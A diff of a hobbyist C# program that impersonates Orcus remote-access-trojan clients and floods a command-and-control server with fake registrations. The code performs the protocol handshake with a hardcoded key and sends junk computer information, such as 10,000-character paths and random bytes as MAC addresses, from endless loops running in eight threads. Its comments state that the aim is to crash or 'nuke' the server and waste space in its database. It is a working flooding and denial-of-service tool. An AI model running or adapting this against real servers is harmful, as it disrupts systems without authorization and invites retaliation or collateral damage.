@@ -1,10 +1,23 @@
 // I don't really use C#. I wrote this for fun and have no clue what proper C# conventions are. Apologies for the ugly code.
 
 using System;
+using System.Collections.Generic;
+using System.IO;
+using System.Linq;
 using System.Net.Security;
 using System.Net.Sockets;
+using System.Security.Cryptography;
 using System.Security.Cryptography.X509Certificates;
+using System.Text;
 using System.Threading;
+using System.Threading.Tasks;
+using orcinnect;
+using Orcus.Shared.Core;
+using Orcus.Shared.NetSerializer;
+
+// Just download their server software, build a CLI server, add it as a reference. 
+// I'm not including it with the repository for reasons that should be obvious.
+// Change the IP address and port, then run the project to nuke the C&C server.
 
 namespace application
 {
@@ -12,68 +25,119 @@ namespace application
     {
         private static int iterations;
 
-        public static bool returnTrue(object          sender, X509Certificate certificate, X509Chain chain,
-                                      SslPolicyErrors sslPolicyError)
+        // shamelessly copypasted from stackoverflow
+        public static string randomString(int length)
         {
-            return true;
+            var random = new Random();
+            const string chars = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789";
+            return new string(Enumerable.Repeat(chars, length)
+               .Select(s => s[random.Next(s.Length)]).ToArray());
         }
-
         public static void doTheThing()
         {
             var client = new TcpClient();
-//            var wait = client.BeginConnect("server-address", port, null, null);
-//            wait.AsyncWaitHandle.WaitOne(TimeSpan.FromSeconds(5));
-//            var binaryWriter = new MalformedBinaryWriter(sslStream);
+            SslStream sslStream = null;
             try
             {
 
-                client.Connect("server-address", port);
-                var sslStream = new SslStream(client.GetStream(), true, returnTrue);
+                client.Connect("13.37.13.37", 1337); 
+                sslStream = new SslStream(client.GetStream(), true, (o, certificate, chain, errors) => true);
                 sslStream.AuthenticateAsClient("Hello.");
-
             }
             catch
             {
+                Console.WriteLine("Failed to connect. Server dead?");
+                return;
             }
 
-            Console.WriteLine("Iteration: " + ++iterations);
-//            Turns out you don't even need the rest of this stuff to trigger an Orcus server crash.
-//            I'm leaving it in because I consider it potentially useful to an RE.
+            sslStream.Write(new byte[] {0}); // client
+            var binaryReader = new BinaryReader(sslStream);
+            var binaryWriter = new BinaryWriter(sslStream, Encoding.UTF8, true);
+            binaryWriter.Write(5); // we're using api v5
+           
+            binaryReader.ReadByte();
+            if (binaryReader.ReadByte() != 0)
+            {
+                Console.WriteLine("Error? 1");
+                return;
+            }
 
-//            sslStream.Dispose();
-//            client.Dispose();
-//            sslStream.Write(new byte[] {1}); // server
-//            var binaryReader = new BinaryReader(sslStream);
-//            var binaryWriter = new MalformedBinaryWriter(sslStream, Encoding.UTF8, true);
-//            binaryWriter.Write(9);
-//
-//            Console.WriteLine("Server: " + binaryReader.ReadByte().ToString()); // status code
-//            Console.WriteLine("Server: " + binaryReader.ReadInt32().ToString()); // if invalid version
+            int         position    = binaryReader.ReadInt32();
+            KeyDatabase keyDatabase = new KeyDatabase();
 
-//            binaryWriter.Write(true); // dunno why it does this
+            binaryWriter.Write(keyDatabase.GetKey(position, "@=<VY]BUQM{sp&hH%xbLJcUd/2sWgR+YA&-_Z>/$skSXZR!:(yZ5!>t>ZxaPTrS[Z/'R,ssg'.&4yZN?S)My+:QV2(c&x/TU]Yq2?g?*w7*r@pmh"));
+            if (binaryReader.ReadByte() != 6)
+            {
+                Console.WriteLine("Error? 2");
+                return;
+            }
+    
+            var provider  = new RNGCryptoServiceProvider();
+            var hwidSalt  = new byte[4];
+            provider.GetBytes(hwidSalt);
+            
+            //hwid
+            binaryWriter.Write("foo bar baz buzz" + BitConverter.ToUInt32(hwidSalt, 0).ToString()); // arbitrary
+            byte b = binaryReader.ReadByte();
+            if (b == 7)
+            {
+                if (new Random().Next(0, 5) < 3)
+                {
+                    binaryWriter.Write("");
+                }
+                else if (new Random().Next(0, 5) < 1)
+                {
+                    binaryWriter.Write(randomString(255));
+                }
+                else
+                {
+                    binaryWriter.Write(randomString(2) + new string('\n', 252));
+                }
 
-//            var stream = client.GetStream();
-//            var socket = (Socket) PrivateValueAccessor.GetPrivateFieldValue(typeof(NetworkStream), "m_StreamSocket", stream);
-//            socket.Send(new byte[] { }, 0, 500000, SocketFlags.None);
-//
-//            string c = new string('z', 300);
-//            binaryWriter.WriteBadString(c);
-//            Console.WriteLine("Server: " + binaryReader.ReadByte().ToString()); // can accept named pipe?
+                b = binaryReader.ReadByte();
+            }
+
+            if (b != 3)
+            {
+                Console.WriteLine("Error 3?");
+                return;
+            }
+
+            var randomKiloByte = new byte[2048];
+            provider.GetBytes(randomKiloByte);
+            var information = new BasicComputerInformation()
+            {
+                UserName             = randomString(new Random().Next(0, 255)),
+                // you can just put in TempleOS too or randomString(256)
+                OperatingSystemName  = "Microsoft Windows 10 Pro",
+                Language             = "English (United States)",
+                IsAdministrator      = new Random().Next(3) != 1,
+                ClientConfig         = null,
+                ClientVersion        = new Random().Next(19),
+                ApiVersion           = 2,
+                ClientPath           = new string('\a', 10000),
+                FrameworkVersion     = 1,
+                MacAddress           = randomKiloByte // wastes space in their database
+            };
+            
+            new Serializer(new List<Type>(BuilderPropertyHelper.GetAllBuilderPropertyTypes())
+            {
+                typeof(BasicComputerInformation)
+            }).Serialize(sslStream, information);
+            
+            
+            Console.WriteLine($"Connected fake client #{++iterations}");
         }
 
         public static void Main(string[] args)
         {
-          Parallel.For(0, 500, i => {
-              while (true) 
-                  try 
-                  { 
-                      doTheThing(); 
-                  } 
-                  catch (Exception e) 
-                  {
-                    Console.WriteLine(e.ToString());
-                  }
-          });
+            for (int i = 0; i < 8; i++)
+            {
+                new Thread(() =>
+                {
+                    while (true) doTheThing();
+                }).Start();
+            };
         }
     }
 }
